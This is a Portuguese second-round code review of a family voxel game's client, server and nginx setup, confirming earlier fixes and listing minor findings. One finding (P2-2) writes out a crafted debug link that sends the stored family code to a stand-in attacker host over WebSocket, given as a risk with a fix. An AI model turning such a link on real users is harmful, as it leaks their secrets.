# REV-01 — Ilha dos Blocos 0.1 — rodada 2

- **Revisor:** REV-01 (revisão de código independente, protocolo de QA v1.1)
- **Candidata:** `ilha-dos-blocos@0.1+ed6a828`, commit `b8a4f47` (árvore limpa, HEAD = `b8a4f47`)
- **Pacote:** `cand-ilha-01/samuel-site.zip`, SHA-256 `af544fc4849d4b1ee66c23634297864cb35b0f3af37217f5226a5efdcebff9ba` (**confere**)
- **Base da rodada 1:** `6bc1d8c`. Diff revisado: `git diff 6bc1d8c b8a4f47`. Entre `ed6a828` e `b8a4f47` só entra `release.json`.
- **Data:** 2026-11-01. Sem navegador e sem SSH. O código da ilha (`~/samuel-tech-ilha-codigo.txt`) **não foi lido**.

## Resultado: **Aprovado** (0 P0 · 0 P1 · 12 P2), com 1 condição antes de publicar (C1)

Os dois P1 da rodada 1 foram resolvidos:

- **P1-1:** não há chave no bundle. O servidor exige o código da família. O nginx fecha tudo, exceto `/ws/` (com Origin e limites), `/registry/` e `/saude`.
- **P1-2:** os avisos de licença agora são gerados a partir dos módulos reais do bundle, com o texto completo de BSD-3 e Apache-2.0.

Sobra uma lacuna de avisos nos crates Rust dentro do wasm do mesh-worker (P2-1).

**C1, condição que não pude verificar por regra.** O cliente faz `.trim().toLowerCase()` no que o adulto digita (`main.ts:212`), e o campo tem `maxlength="40"` (`cliente/index.html:31`). Se o código real tiver maiúscula, espaço no meio ou mais de 40 caracteres, a família **nunca** entra: a tela vai dizer sempre "Esse código não abriu a ilha". Nesse caso o achado vira **P1**.

O risco é real: o outro gerador do projeto (`ferramentas/novo_codigo.py:5`) usa só MAIÚSCULAS. O teste externo do executor (101 com o código certo) não passa por essa normalização. Para fechar, o executor confere sem mostrar o código (por exemplo, `grep -c '[A-Z[:space:]]' ~/samuel-tech-ilha-codigo.txt` deve dar 0 e `wc -c` ≤ 41), ou o QA de navegador digita o código na tela real e entra.

## Comandos rodados

| Comando | Resultado |
|---|---|
| `shasum -a 256 cand-ilha-01/samuel-site.zip` | `af544fc4…9ba` ✓ |
| `git archive --format=zip b8a4f47 <mesma lista do empacotar.sh>` | **byte a byte idêntico** ao zip (mesmo SHA-256; comentário do zip = `b8a4f47…`) |
| hashes de `files` do `release.json` × arquivos do zip | 6/6 ✓ |
| `vite build` do fonte de `b8a4f47` em pasta do scratchpad (`VITE_ILHA_SERVIDOR=https://srv2114451.hstgr.cloud:8443/`) | **6/6 arquivos com o mesmo SHA-256** do zip e do `release.json`: o bundle publicado é reproduzível a partir do fonte |
| `npx vitest run` (cliente) | 12/12 ok |
| `npx tsc --noEmit` (cliente) | ok |
| `cargo test --release` (servidor, `CARGO_TARGET_DIR` no scratchpad) | 5/5 ok |
| `python3 ferramentas/verificar_jogo.py --todos` | 6 jogos ✓ (ilha: 7 arquivos, 2,1 MB) |
| Casos do verificador (ver P2-12) | `URL(/x)` e `Url('/x')` em CSS são pegos; `amplitude.init(` é pego |

## Verificação dos P1 da rodada 1

### P1-1 · Mundo aberto — **Resolvido**

**Bundle (zip):**

- `ilha-local` aparece **0 vezes** em `index-F-AAPJJ1.js`, nos dois workers e no `index.html`.
- `import.meta.env.DEV` foi dobrado para falso. O trecho real fica assim: `let Fn=Bp&&Zp.get("codigo")||AT()||"";` (debug+`?codigo`, depois o localStorage, depois vazio).
- Não sobra `VITE_*` nem `import.meta.env` no bundle.
- O único `secret` vem do código digitado ou guardado: `searchParams.set("secret", r)` no teste e `secret:Fn` no `network.connect`.

**Histórico:**

- Nenhum arquivo `.env`, `ilha.env` ou `.env.*` em nenhum commit de nenhuma ref (`git log --all --name-only`).
- `ILHA_SEGREDO=` só aparece como `ILHA_SEGREDO=...`, no comentário de `main.rs:1`.
- `VITE_ILHA_SEGREDO` só aparece como leitura de variável, sem valor, e saiu em `ed6a828`.
- A antiga `ilha-local` continua no histórico e nos zips antigos da branch `publicacao`. Ela é pública por definição e, pelo teste do executor, hoje recebe 403.

**Servidor:**

- O Voxelize compara o `secret` da query (`voxelize-3.0.0/server/runtime.rs:401-416`). Um código errado volta como `io::ErrorKind::PermissionDenied`, ou seja, 403. Isso bate com o teste do executor.
- O `warn!` que registraria o código tentado (`runtime.rs:406-409`) fica abaixo de `RUST_LOG=error` (`ilha-dos-blocos.service:14`).

**nginx (`ilha-dos-blocos.nginx.conf`):**

- `location = /ws/` com `if ($ilha_origem_ok = 0) { return 403; }` (linha 32). O `return` roda na fase de rewrite, antes do `limit_req`.
- `limit_req … burst=10 nodelay` e `limit_conn … 6` (linhas 33-34).
- `/registry/` só aceita GET (linha 45). O upstream não tem essa rota e responde 404.
- `/saude` vira `/` no upstream (linha 52) e responde 404 com o CORS do `Cors::permissive()`, que basta para o `fetch` resolver.
- Todo o resto recebe `return 404`. Assim fecham `/info` e `/health` (rodada 1, P2-2).
- `access_log off` e `error_log … crit` fecham a rodada 1, P2-1.

**Decisão:** DEC-013 registra o aceite e os limites conhecidos. A descrição do `jogos.json` ("fica guardado na ilha da família") agora é verdadeira.

O mundo deixa de ser aberto **enquanto o código estiver só com a família**. Há caminhos para o código vazar ou para o servidor voltar a aceitar uma chave fraca. Eles estão abaixo como P2, porque exigem engenharia social dirigida ou um erro de configuração.

### P1-2 · Avisos de licença — **Resolvido para o JS** (resto no P2-1)

**Plugin `avisosDeLicenca`** (`cliente/vite.config.ts:6-38`):

- Percorre `chunk.modules` e tira o prefixo `\0` e o `?query` dos módulos virtuais.
- Acha a pasta do pacote dentro de `node_modules`, com escopo `@x/y`.
- Junta o arquivo `LICENSE`, `LICENCE` ou `COPYING` inteiro. Sem esse arquivo, usa o campo `license`.

**`THIRD_PARTY_NOTICES.txt` do zip.** São 27 pacotes, sem repetição:

| Licença | Pacotes |
|---|---|
| BSD-3-Clause | 7 protobuf (texto completo) |
| Apache-2.0 | `long`, com o texto completo de "TERMS AND CONDITIONS" a "END OF TERMS" |
| zlib | `gl-vec3`, `postprocessing` |
| MIT | os demais, entre eles three, zod, uuid, omggif, ndarray, iota-array, is-buffer, events, domurl, deepmerge e os `@voxelize/*` |

O arquivo não tem caminho local (`/Users`, `boaz`).

**Amostra de cabeçalhos no JS**, todos cobertos:

- `Copyright 2010-2026 Three.js Authors` → three
- `Copyright 2015-2026 Raoul van Rüschen` → postprocessing
- `Copyright 2020 Daniel Wirtz / The long.js Authors` e `Copyright 2009 The Closure Library Authors` → long
- `@license Zlib` → gl-vec3 / postprocessing

**Dependências declaradas do core que não entraram no bundle:** `@tweenjs/tween.js`, `fflate`, `lz4js`, `noisejs`, `jsonfn`, `socket.io-client` e `regenerator-runtime` não aparecem no JS (grep). O `index.mjs` do core só importa 17 pacotes externos, e todos estão na lista.

**Documentação:** `RECURSOS.md:13` e `ADR-001-base.md:19` foram corrigidos (16 MIT, 7 BSD-3, 1 Apache, 2 zlib). Somando com os pacotes que o ADR não lista, isso fecha com os 27 do arquivo.

## P2 — pode seguir (registrar e tratar)

### P2-1 · O wasm do mesh-worker traz crates Rust sem aviso

**Onde:** `assets/mesh-worker-DHcFKpZ1-ChWRxrWQ.js`, com o wasm de 264 KB em base64. O cabeçalho de `THIRD_PARTY_NOTICES.txt:2` diz "workers … mesma licença MIT".

**Fato:** o plugin só enxerga módulos do Rollup. Os workers vêm prontos do `@voxelize/core` como asset e ficam de fora. No wasm aparecem `wasm-bindgen-0.2.125`, `js-sys-0.3.102`, `serde-1.0.228`, `serde_core`, `serde-wasm-bindgen-0.6.5`, `hashbrown-0.14.5/0.16.1`, `dlmalloc-0.2.11`, `console_error_panic_hook-0.1.7` e a std do Rust. Todos são `MIT OR Apache-2.0`, mas nenhum aviso deles aparece.

O próprio `@voxelize/wasm-mesher` é MIT do mesmo titular do core (© 2022 Shaoru Ian Huang), então já está coberto pelo texto do core. O light-worker só traz voxelize, ndarray, iota-array e is-buffer, que estão na lista.

**Por que P2:** a licença é permissiva e da mesma família, o binário é compilado e o texto MIT já vai no arquivo. Faltam as linhas de copyright de cada crate.

**Correção barata:** um bloco fixo no plugin com esses 9 crates mais a std do Rust (`cargo about`, ou a lista acima), e corrigir a frase do cabeçalho.

### P2-2 · `?debug&servidor=` em produção pode vazar o código guardado

**Onde:** `main.ts:14`, `main.ts:20`, `main.ts:188-191`.

**Cenário:** alguém manda para a família o link `https://samuel.tech/jogo/ilha-dos-blocos/index.html?debug&servidor=https://atacante.exemplo/`. Num aparelho que já tem o código no localStorage (mesma origem `samuel.tech`), o clique em "Entrar" chama `testarCodigo(codigo)`, que abre `wss://atacante.exemplo/ws/?secret=<código>`. O atacante recebe o código e chega ao cenário do antigo P1-1 (apagar ou escrever na ilha).

O ataque exige engenharia social dirigida a esta família, por isso é P2. Na rodada 1 era só conveniência (P2-8). Agora protege um segredo.

**Correção (uma linha):** aceitar `servidor`/`codigo` da URL e expor `__ilha` só com `import.meta.env.DEV`, ou só com servidor `localhost`/`127.0.0.1`.

### P2-3 · Qualquer recusa do `/ws/` com o nginx de pé apaga o código guardado

**Onde:** `main.ts:194` (`onerror/onclose` → `fetch('saude')` ok → `'recusado'`) e `main.ts:229-232` (apaga o código e pede de novo).

**Fato:** o cliente trata como "código errado" qualquer falha do WebSocket enquanto `/saude` responde. Isso inclui:

- **503 do `limit_req`/`limit_conn`** (`nginx.conf:33-34`; o status padrão é 503).
- **Rede que bloqueia WebSocket e deixa passar HTTPS** (proxy de escola, alguns antivírus).
- **Origin fora da lista.**

**Cenário concreto:**

1. Dois computadores da casa (mesmo IP de NAT) ficam no laço de reconexão do core durante uma queda do servidor. O core tenta a cada 3 s (`DEFAULT_RECONNECT_TIMEOUT_MS = 3e3`, `index.mjs:9237`), ou seja, cerca de 40 req/min contra a taxa de 20/min.
2. Quando o servidor volta, a criança abre a ilha num terceiro aparelho, ou recarrega a página.
3. O teste toma 503, o código é apagado e aparece "Esse código não abriu a ilha". Ela precisa de um adulto para digitar de novo.

**Correções possíveis:**

- `limit_req_status 429` e `limit_conn_status 429` no nginx.
- No cliente, só apagar o código se a falha se repetir duas vezes seguidas e o `/saude` estiver ok. Ou não apagar: só mostrar a mensagem e deixar o código no campo.

### P2-4 · O servidor ainda aceita `ilha-local` ou um segredo vazio se o `.env` estiver errado

**Onde:** `servidor/src/main.rs:36-41`.

**Fato:** sem `ILHA_SEGREDO` (linha com erro de digitação, `export ` na frente, variável sem valor), o servidor usa `ilha-local`, que é pública e está no histórico. A trava (`panic!`) só olha `endereco != "127.0.0.1"`, e atrás do nginx o endereço é sempre 127.0.0.1. Com `ILHA_SEGREDO=` vazio, `.secret("")` vira `Some("")` (`builder.rs:78-80`), e um cliente sem código (`secret=`) entra.

**Por que P2:** o executor testou de fora que a "chave antiga" recebe 403, então hoje está certo. Falta testar `secret=` vazio.

**Correção:** recusar a partida com segredo vazio, ou igual a `ilha-local`, sempre que `ILHA_DADOS` não for o padrão de dev. Também dá para exigir `ILHA_MODO_LOCAL=1` para aceitar `ilha-local`, e checar também o tamanho mínimo do segredo.

### P2-5 · Backup: tirar o `set -e` faz a limpeza rodar mesmo quando a cópia falha

**Onde:** `ilha-backup.sh:3`, `:7`, `:8`.

**Fato:** com só `set -u`, se o `tar` sai com 2 (disco cheio, permissão), o `|| [ $? -eq 1 ]` dá falso e o script **continua** para o `find -delete`. A rodada 1 pediu tolerar o código 1. A mudança tolerou qualquer falha.

**Cenário:** disco cheio. A cada hora o `tar` deixa um `.tar.gz` truncado com mtime novo. Depois de 72 h o `find` apagou todas as cópias boas, e sobram só arquivos corrompidos. A janela de 3 dias também é curta para notar vandalismo ou um erro: antes eram 14 dias.

**Correção:**

- `set -eu`.
- Gravar em `.tmp` e só renomear se `rc ≤ 1`.
- Apagar as antigas só depois de uma cópia boa.
- Manter também uma cópia diária por 14 dias.

### P2-6 · Tablet: a caixa do código aparece e o Enter entra no mundo

**Onde:** `main.ts:255` esconde só o `bEntrar`. Depois, `telaInicio()` (`main.ts:171`, `:287`) mostra a `caixaCodigo` com foco automático (`:175`), e o Enter do campo chama `entrar()` (`:247`).

**Cenário:** no tablet sem mouse, a criança vê "Código da ilha / peça para um adulto" ao lado do aviso "a ilha é no computador". O adulto digita o código e aperta Enter (ou "Ir" no teclado virtual). A criança entra num mundo sem controle de toque, que é o que a proteção queria evitar. Não fica presa, porque o "II" leva à pausa e de lá aos Jogos.

**Correção:** com a proteção de toque ligada, esconder `caixaCodigo` e `bTrocarCodigo` e fazer `entrar()` retornar cedo.

### P2-7 · Aviso de reconexão: pode sumir antes da hora e não tem fim

**Onde:** `main.ts:276-279` e `aviso()` (`:140-143`).

**Fatos:**

- O estado só muda na transição. Se um `aviso()` aparecer durante a queda (por exemplo "Ops! De volta para o meio da ilha."), ele troca o texto e esconde o toast depois de 1,8 s com a conexão ainda caída. "Reconectando…" não volta.
- Sem um limite de tempo, uma queda longa, ou a troca do código no servidor com a criança jogando, deixa "Reconectando…" na tela para sempre.

A rodada 1 sugeria voltar para "a ilha está dormindo" depois de N segundos. Rodada 1, P2-7: **parcial**.

### P2-8 · Volta do vazio: chamada a cada quadro se o chunk do meio não estiver pronto

**Onde:** `main.ts:274`.

**Fato:** com o chunk (0,0) fora do cache, `teleportToTop` (`index.mjs`, cerca da linha 7480) registra um `addChunkInitListener`. A condição continua verdadeira no quadro seguinte, então entra um ouvinte novo e um `aviso()` a cada quadro até o chunk carregar.

**Impacto:** baixo. O mundo inteiro tem 10×10 chunks e `defaultRenderRadius` é 6, então o chunk do meio quase sempre está carregado.

**Correção:** uma flag "voltando" até o `teleport` acontecer.

Fora isso, a volta e o "não quebra y ≤ 1" estão corretos. O terreno preenche `0..=h` (`terreno.rs:78`), então o fundo continua sólido. Rodada 1, P2-10: **resolvido**.

### P2-9 · Força do código e brute force

O `limit_req` de 20/min por IP permite cerca de 28,8 mil tentativas por dia por IP. Não pude conferir a entropia do código (C1). Recomendação: pelo menos 12 caracteres aleatórios de `[a-z2-9]` (cerca de 60 bits), coerente com o `toLowerCase`. Registrar em DEC-013 como o código foi gerado, sem o valor.

### P2-10 · Higiene do repositório

- O `.gitignore` não cobre `*.env` / `ilha.env`. Como o repositório é público, vale prevenir um `git add` acidental.
- `nginx.conf:2` ainda diz que o cliente usa `/registry/`, e ele não usa (só `/ws/`). Então o `location ^~ /registry/` pode sair.
- Continua faltando um README de instalação em `desenvolvimento/infra/vps/` (usuário, `install -d`, linha do cron, firewall). A linha do cron "de hora em hora" não está no repositório.

### P2-11 · systemd

`EnvironmentFile=` continua **sobrepondo** `Environment=`, qualquer que seja a ordem das linhas (`ilha-dos-blocos.service:12-14`). Então um `ILHA_ENDERECO` no `.env` ainda vale. O endurecimento extra sugerido na rodada 1 não entrou. Rodada 1, P2-5: **parcial**.

### P2-12 · Verificador

`ABSOLUTO_CSS` em `.html` dá falso positivo para JS inline com `new URL('/x', …)`: testei, e `<script>new URL('/x', location)</script>` é recusado. Isso falha fechado, então é seguro, só pode irritar. `window.amplitude.track(` ainda passa, o que é aceitável. O campo `servidor` no `jogos.json` para dependência externa não foi feito. Rodada 1, P2-14: **resolvido** no essencial.

Extra, só cosmético: as instruções do `jogos.json` (`_app/jogos.json:130`) não dizem que, na primeira vez, um adulto digita o código da ilha. Um visitante de fora vê o jogo como "pronto" e não consegue entrar. Isso é aceito pela DEC-013, mas vale uma linha nas instruções.

## Regressões conferidas sem defeito

**`testarCodigo` (`main.ts:178-196`):**

- Um só `resolver` (flag `feito`) e `clearTimeout` no fim.
- Os handlers são anulados antes do `close()`, então o `close` do caminho "ok" não dispara o `fetch`.
- Com o timeout de 8 s, a resposta é "fora" e um `fetch` atrasado é ignorado.
- O `new WebSocket` fica em `try`.
- `onerror` e `onclose` disparam dois `fetch`, sem efeito por causa do `feito`.
- Não sobra socket nem timer.

**`conectar`/`entrar`:**

- O teste vem antes do `network.connect`.
- `CodigoRecusado` e "fora" caem no `catch`, que zera `iniciando` e chama `network.disconnect()`. Isso limpa `serverURL`, então o reconectar do core não continua escondido.
- O código só é guardado depois de entrar com sucesso.
- `iniciando ??=` evita duas conexões.
- O `tempo` de 15 s dentro de `Promise.race` não gera rejeição não tratada.

**Fallback do pointer lock (`:224`):** se o lock não pegou em 600 ms, troca para o namespace `menu` e mostra a pausa. O "Continuar" é um gesto novo. Rodada 1, P2-9: **resolvido**.

**`network.connected` existe no core 3.0.0** (`network/index.d.ts:56`). O core monta `secret` com `searchParams.set`, que codifica corretamente.

**CSS novo:** alvos de toque ≥ 44 px (`button.link`), foco visível com `--focus`.

**`vite.config.ts`:** o plugin só roda no build (`apply: 'build'`), e o `public/THIRD_PARTY_NOTICES.txt` saiu. Não há conflito de nome no `emitFile`.

## Status dos achados da rodada 1

| Achado | Status |
|---|---|
| P1-1 mundo aberto / chave pública / proxy sem limite | **Resolvido** (C1 e P2-2/3/4/9 como ressalvas) |
| P1-2 avisos de licença incompletos | **Resolvido** no JS. A lacuna do wasm virou o P2-1 |
| P2-1 `error_log` com IP | Resolvido (`crit`) |
| P2-2 `/info`, `/health` públicos | Resolvido (404) |
| P2-3 servidor repassa chat | Mitigado: só quem tem o código conecta. O relé continua no motor |
| P2-4 INIT com a config | Mitigado (idem) |
| P2-5 systemd mínimo / README | Parcial (P2-10, P2-11) |
| P2-6 backup | Parcial e com regressão (P2-5): código 1 tolerado, mas a limpeza roda mesmo com falha. Continua sem cópia fora da VPS (aceito na DEC-013) |
| P2-7 queda sem aviso | Parcial (P2-7) |
| P2-8 `?debug` em produção | Aberto e agora mais relevante (P2-2) |
| P2-9 pointer lock depois de `await` | Resolvido |
| P2-10 cair no vazio / quebrar o fundo | Resolvido (detalhe no P2-8) |
| P2-11 proteção de tablet | Ok, com a brecha nova do P2-6 |
| P2-12 peso do JS | Aceito na DEC-013 (425 KB gzip no principal; cerca de 591 KB com os workers) |
| P2-13 sem teste do `EstagioIlha::process` | Aberto (servidor sem mudança) |
| P2-14 verificador | Resolvido no essencial (P2-12) |
| Documentação (ESTADO, ADR com Caddy) | Resolvido. Falta o comentário do nginx (P2-10) |

## Não verificado

- **C1:** formato do código real (minúsculas, sem espaço, ≤ 40 caracteres) e a entropia dele. Não li o arquivo, por regra.
- Estado real da VPS: se o `ilha.env` está com `ILHA_SEGREDO` preenchido (o teste "chave antiga → 403" indica que sim), a linha do cron, o nginx carregado e o firewall.
- O fluxo na tela real: código certo, código errado, servidor fora, reconexão. Fica para o QA de navegador.

## Arquivos de referência

- `/Users/boaz_mac/Workspace/06-ANDAIME-IO/Samuel.Tech/Games/desenvolvimento/jogos/ilha-dos-blocos/cliente/src/main.ts`
- `/Users/boaz_mac/Workspace/06-ANDAIME-IO/Samuel.Tech/Games/desenvolvimento/jogos/ilha-dos-blocos/cliente/index.html`
- `/Users/boaz_mac/Workspace/06-ANDAIME-IO/Samuel.Tech/Games/desenvolvimento/jogos/ilha-dos-blocos/cliente/vite.config.ts`
- `/Users/boaz_mac/Workspace/06-ANDAIME-IO/Samuel.Tech/Games/desenvolvimento/jogos/ilha-dos-blocos/servidor/src/main.rs`
- `/Users/boaz_mac/Workspace/06-ANDAIME-IO/Samuel.Tech/Games/desenvolvimento/infra/vps/ilha-dos-blocos.nginx.conf`
- `/Users/boaz_mac/Workspace/06-ANDAIME-IO/Samuel.Tech/Games/desenvolvimento/infra/vps/ilha-dos-blocos.service`
- `/Users/boaz_mac/Workspace/06-ANDAIME-IO/Samuel.Tech/Games/desenvolvimento/infra/vps/ilha-backup.sh`
- `/Users/boaz_mac/Workspace/06-ANDAIME-IO/Samuel.Tech/Games/_privado/jogos/ilha-dos-blocos/THIRD_PARTY_NOTICES.txt`
- `/Users/boaz_mac/Workspace/06-ANDAIME-IO/Samuel.Tech/Games/_privado/jogos/ilha-dos-blocos/release.json`
- Rebuild de conferência: `/private/tmp/claude-501/-Users-boaz-mac-Workspace-06-ANDAIME-IO-Samuel-Tech-Games/ebc8bade-2c59-49ae-95d3-a4811132d6c9/scratchpad/rev01r2/build/`
- Crate: `~/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/voxelize-3.0.0/server/{runtime.rs,server/builder.rs}`
